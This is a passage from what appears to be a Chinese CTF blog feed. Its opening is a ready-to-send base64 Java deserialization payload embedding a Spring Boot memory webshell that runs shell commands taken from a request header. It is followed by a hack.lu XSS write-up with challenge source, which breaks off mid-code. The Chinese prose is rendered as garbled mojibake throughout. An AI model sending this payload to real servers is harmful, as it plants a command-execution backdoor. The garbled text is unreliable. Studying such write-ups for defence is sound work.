F4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB%2BACBMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA%2F%2F%2F%2F%2F3VyAANbW0JL%2FRkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF%2FgGCFTgAgAAeHAAABdGyv66vgAAADQBDQoAOQCCCgCDAIQJABAAhQoAhgCHCACICwCJAIoHAIsHAIwLAAcAjQoAjgCPCABKCgASAJAKAJEAkgoAkQCTBwCVBwCWCABdBwCXBwCYBwCZCgASAJoHAJsIAJwKAJQAnQsAngCfCwCeAKAKAIMAoQgAogoAEACjCgAIAKQJAKUApgoApwCoCACpCwATAKoIAKsKAKUArAoAFgCtCACuCgAWAK8IALAIALEIALIIALMKALQAtQoAtAC2CgC3ALgHALkKAC8AuggAuwoALwC8CgAvAL0KAC8AvggAvwsAFADACgDBAMIKAMEAwwcAxAEAAWkBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAIXNwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlcgEAM0xnYWRnZXQvbWVtc2hlbGwvU3ByaW5nQm9vdE1lbW9yeVNoZWxsT2ZDb250cm9sbGVyOwEABHRoaXMBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAARpbmZvAQA%2FTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQANU3RhY2tNYXBUYWJsZQcAlgcAiwcAjAcAxQcAlQcAxgcAxwEACkV4Y2VwdGlvbnMHAMgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAR0ZXN0AQASTGphdmEvbGFuZy9TdHJpbmc7AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7BwCbBwBkBwDJBwC5BwCYBwCZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAygEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAJlNwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlci5qYXZhDAA8AD0HAMsMAMwAzQwAOgA7BwDODADPANABADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHANEMANIA0wEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA1ADVBwDWDADXANgMANkA2gcAxQwA2wDcDADdAN4HAMcBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uAQAxZ2FkZ2V0L21lbXNoZWxsL1NwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlcgEAD2phdmEvbGFuZy9DbGFzcwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQwA3wDgAQAQamF2YS9sYW5nL1N0cmluZwEABi90ZXN0MgwA4QDjBwDkDADlAOYMAOcA6AwA6QDqAQADYWFhDAA8AFwMAOsA7AcA7QwA7gDvBwDwDADxAPIBAAhzcXVpcnQxZQwA8wD0AQAHb3MubmFtZQwA9QD0DAD2APcBAAN3aW4MAPgA%2BQEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAPoMAPsA%2FAwA%2FQD%2BBwD%2FDAEAAQEBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPAECAQACXEEMAQMBBAwBBQEGDAEHAPcBAAAMAQgBCQcBCgwBCwBcDAEMAD0BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL09iamVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAIaW50VmFsdWUBAAMoKUkBAA9yZWdpc3Rlck1hcHBpbmcBAG4oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBAAVmbHVzaAAhABAAOQAAAAEAAQA6ADsAAAAFAAEAPAA9AAIAPgAAAW8ABgAIAAAAoyq3AAEqA7gAArUAA7gABBIFA7kABgMAwAAHTCsSCLkACQIAwAAITSy2AAoSC7YADE4tBLYADS0stgAOwAAPOgQSEBIRBb0AElkDEhNTWQQSFFO2ABU6BQS9ABZZAxIXU7gAGBkEuQAZAgC5ABoBADoGKrQAA7YAG5oAKrsAEFkSHLcAHToHLBkGGQcZBbYAHrIAHyq0AAO2ACAqBLgAArUAA7EAAAADAD8AAAA%2BAA8AAAAaAAQAGAAMABwAGwAeACcAIAAxACEANgAiAEAAJQBXACgAcQAqAHsAKwCGACwAkAAtAJoALgCiADEAQAAAAFIACACGABwAQQBCAAcAAACjAEMAQgAAABsAiABEAEUAAQAnAHwARgBHAAIAMQByAEgASQADAEAAYwBKAE0ABABXAEwATgBPAAUAcQAyAFAAUQAGAFIAAAAeAAH%2FAKIABwcAUwcAVAcAVQcAVgcAVwcAWAcAWQAAAFoAAAAEAAEAWwABADwAXAABAD4AAABJAAIAAgAAAA0qtwABKgO4AAK1AAOxAAAAAgA%2FAAAADgADAAAAMwAEABgADAA1AEAAAAAWAAIAAAANAEMAQgAAAAAADQBdAF4AAQABAF0AXwACAD4AAAGDAAUACQAAAKkrEiG5ACICAMYAoAQ%2BEiO4ACQ6BBkExgASGQS2ACUSJrYAJ5kABQM%2BHZkAHwa9ABZZAxIoU1kEEilTWQUrEiG5ACICAFOnABwGvQAWWQMSKlNZBBIrU1kFKxIhuQAiAgBTOgW4ACwZBbYALbYALjoGuwAvWRkGtwAwEjG2ADI6BxkHtgAzmQALGQe2ADSnAAUSNToILLkANgEAGQi2ADcsuQA2AQC2ADixAAAAAwA%2FAAAAMgAMAAAAOAALADkADQA6ABQAOwAmADwAKAA%2BAGMAPwBwAEAAgABBAJQAQgCfAEMAqABFAEAAAABcAAkADQCbAGAAYQADABQAlABiAF4ABABjAEUAYwBkAAUAcAA4AGUAZgAGAIAAKABnAGgABwCUABQAaQBeAAgAAACpAEMAQgAAAAAAqQBqAGsAAQAAAKkAbABtAAIAUgAAAC4ABv0AKAEHAG4fWAcAb%2F4ALgcAbwcAcAcAcUEHAG7%2FABUAAwcAUwcAcgcAcwAAAFoAAAAEAAEAWwABAHQAdQACAD4AAAA%2FAAAAAwAAAAGxAAAAAgA%2FAAAABgABAAAASgBAAAAAIAADAAAAAQBDAEIAAAAAAAEAdgB3AAEAAAABAHgAeQACAFoAAAAEAAEAegABAHQAewACAD4AAABJAAAABAAAAAGxAAAAAgA%2FAAAABgABAAAATwBAAAAAKgAEAAAAAQBDAEIAAAAAAAEAdgB3AAEAAAABAHwAfQACAAAAAQB%2BAH8AAwBaAAAABAABAHoAAgCAAAAAAgCBAEwAAAASAAIADwCUAEsACQCeAJQA4gYJcHQACFNxdWlydDFlcHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAN2cgAjb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuU3ByaW5nUHJveHkAAAAAAAAAAAAAAHhwdnIAKW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkAAAAAAAAAAAAAAB4cHZyAChvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuRGVjb3JhdGluZ1Byb3h5AAAAAAAAAAAAAAB4cA%3D%3D%22%3A%22%22%7D%7D%7D</code></pre><p>ç”¨è¿™ä¸ª<code>payload</code>æ‰“ä¸¤æ¬¡å³å¯ï¼Œç¬¬ä¸€æ¬¡èµ‹å€¼<code>false</code>å’Œ<code>payload</code>ï¼Œç¬¬äºŒæ¬¡ååºåˆ—åŒ–åˆ©ç”¨ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1700660237449.png" alt="1700660237449"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°hack.luä¸¤é“XSSé¢˜</title>
      <link href="/2023/10/31/hacklu-liang-dao-xss/"/>
      <url>/2023/10/31/hacklu-liang-dao-xss/</url>
      
        <content type="html"><![CDATA[<p>è™½ç„¶éƒ½æ˜¯ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯éƒ½æ˜¯ç­¾åˆ°é¢˜ä¸å¤ªå¯èƒ½ã€‚</p><h4 id="Based-Encoding"><a href="#Based-Encoding" class="headerlink" title="Based Encoding"></a>Based Encoding</h4><p><code>note</code>é¢˜ï¼Œæœ€ä¸»è¦çš„è·¯ç”±å°±ä¸‹é¢è¿™ä¸‰ä¸ªã€‚<code>/create</code>åˆ›å»ºä¸€ä¸ª<code>note</code>ï¼Œä½†æ˜¯å†…å®¹ä¼šè¢«<code>base91</code>ç¼–ç ï¼Œè¿™é‡Œçº¯ç²¹æ˜¯ä¸ºäº†åŠ éš¾åº¦è€ŒåŠ éš¾åº¦ã€‚è°å®¶<code>note</code>å†™å®Œäº†ä¼šå¥—ä¸€å±‚ç¼–ç ï¼Œå½“è°œè¯­äººå—ï¼Ÿ</p><p><code>encoding_id</code>æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¯ä»¥ç”¨è¿™ä¸ª<code>id</code>é€šè¿‡<code>/e/id</code>è®¿é—®<code>note</code>ã€‚</p><p><code>/report</code>å‘<code>admin</code>ä¸¾æŠ¥ä¸€ä¸ª<code>note</code>ï¼Œ<code>admin</code>ä¼šè®¿é—®è¿™ä¸ª<code>note</code>ï¼Œå¹¶ä¸”<code>flag</code>åªæœ‰<code>admin</code>èƒ½è®¿é—®ã€‚</p><p>è¿™é‡Œè¿›è¡Œäº†æ¯”è¾ƒä¸¥æ ¼çš„é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æäº¤note idã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">,</span> cur <span class="token operator">=</span> get_cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, admin INTEGER)"</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO accounts (username, password, admin) VALUES ('admin', ?, 1)"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>admin_password<span class="token punctuation">]</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS encodings (id TEXT NOT NULL UNIQUE, text TEXT NOT NULL, creator, expires INTEGER DEFAULT 0)"</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO encodings (id, text, creator, expires) VALUES (?, ?, 'admin', 0)"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> FLAG<span class="token punctuation">]</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    db<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">//</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"Please log in"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Missing text"</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">)</span>        encoded <span class="token operator">=</span> based91<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]+$"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">else</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>        encoding_id <span class="token operator">=</span> create_encoding<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> encoded<span class="token punctuation">)</span>                <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>f<span class="token string">"/e/{encoding_id}"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/e/&lt;encoding_id>"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getEncoding</span><span class="token punctuation">(</span>encoding_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    logged_out <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span> <span class="token keyword">is</span> None    encoding <span class="token operator">=</span> get_encoding<span class="token punctuation">(</span>encoding_id<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"view_encoding.html"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">,</span> logged_out<span class="token operator">=</span>logged_out<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/report"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">not</span> session<span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"Please log in"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> value <span class="token operator">or</span> <span class="token operator">not</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]{40}$"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">"invalid value!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"timeout"</span><span class="token punctuation">,</span> <span class="token string">"-k"</span> <span class="token string">"15"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">,</span> <span class="token string">"node"</span><span class="token punctuation">,</span> <span class="token string">"adminbot.js"</span><span class="token punctuation">,</span> base_url<span class="token punctuation">,</span> admin_password<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    flash<span class="token punctuation">(</span><span class="token string">"An admin going there."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"report.html"</span><span class="token punctuation">,</span> logged_out<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€è·¯å¾ˆæ˜æ˜¾å°±æ˜¯è¦é€šè¿‡<code>note</code>è§¦å‘<code>xss</code>ï¼Œç„¶åä¸¾æŠ¥ç»™<code>admin</code>ä»è€Œè·å–ä»–çš„<code>cookie</code>ä¹‹ç±»çš„ã€‚</p><h5 id="step1-Lead-to-XSS"><a href="#step1-Lead-to-XSS" class="headerlink" title="step1 Lead to XSS"></a>step1 Lead to XSS</h5><p>&#x2F;e&#x2F;noteidè¿™ä¸ªè·¯ç”±é€šè¿‡<code>render_template</code>æ¸²æŸ“<code>view_encoding.html</code>ï¼Œè€Œèƒ½å¯¼è‡´<code>xss</code>çš„å…³é”®å°±åœ¨äºï¼š</p><pre><code>&lt;h2 class=&quot;subtitle&quot;&gt;&#123;&#123;encoding|safe&#125;&#125;&lt;/h2&gt;</code></pre><p><code>safe</code>ä½¿å¾—æ¸²æŸ“çš„ä»£ç ä¸è¿›è¡Œè½¬ä¹‰ç›´æ¥è¾“å‡ºåœ¨é¡µé¢ä¸Šï¼Œå¦‚æœåˆ æ‰è¿™ä¸ª<code>safe</code>æ¸²æŸ“è‡ªåŠ¨è¿›è¡Œè½¬ä¹‰çš„è¯å°±æ²¡åŠæ³•<code>xss</code>äº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697517817188.png" alt="1697517817188"></p><p>è¿™ä¹Ÿæ˜¯<code>ssti-&gt;xss</code>çš„ä¸€ä¸ªå°<code>trick</code>ã€‚<code>&#123;&#123;request.args.p|safe&#125;&#125;</code></p><p>å¦‚ä½•è®©<code>base91</code>åçš„å†…å®¹ä¸ºï¼š</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>å…¶å®åªè¦è°ƒç”¨<code>base91</code>çš„è§£ç å‡½æ•°å°±å¯ä»¥å®ç°äº†ã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> based91<span class="token keyword">import</span> binascii<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">timu</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token 